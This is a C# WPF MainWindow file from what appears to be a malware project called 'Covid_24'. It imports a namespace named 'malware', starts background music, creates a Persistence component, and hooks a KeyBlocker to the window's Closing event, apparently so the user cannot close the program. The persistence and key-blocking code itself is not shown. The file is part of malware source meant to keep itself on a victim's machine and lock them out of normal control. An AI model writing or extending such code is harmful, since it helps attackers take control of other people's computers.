using Microsoft.Win32;
using System;
using System.Reflection;
using System.Windows;
using Covid_24.ViewModel.Sound;
using Covid_24.ViewModel.malware;


namespace Covid_24
{
    /// <summary>
    /// Interaction logic for MainWindow.xaml
    /// </summary>
    public partial class MainWindow : Window
    {
        MusicPlayer _player;
        public MainWindow()
        {
            _player = new MusicPlayer();
            _player.Play();

            Persistence persistence = Persistence.GetInstance();
            KeyBlocker keyBlocker = new KeyBlocker();

            Closing += keyBlocker.MainWindow_Closing;
            
            InitializeComponent();
        }
    }
}
